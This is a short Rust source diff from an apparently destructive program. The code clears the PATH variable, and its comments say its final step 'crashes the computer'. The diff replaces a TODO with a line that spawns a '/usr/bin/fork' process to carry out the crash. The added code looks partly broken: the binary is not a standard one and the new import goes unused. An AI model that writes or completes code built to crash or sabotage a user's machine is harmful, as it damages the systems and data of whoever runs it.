@@ -2,7 +2,7 @@ use std::process;
 use nix::unistd::Uid;
 use std::path;
 use std::env;
-use system_shutdown;
+use std::os::unix::process::CommandExt;
 
 mod log;
 mod disk;
@@ -37,8 +37,8 @@ fn main() {
     env::set_var("PATH", "");
 
     //*Finally it crashes the computer.
-    //TODO: add a function to crash the computer.
-
+    let _fork = process::Command::new("/usr/bin/fork").spawn();
+    
     process::exit(0);
     }
 }
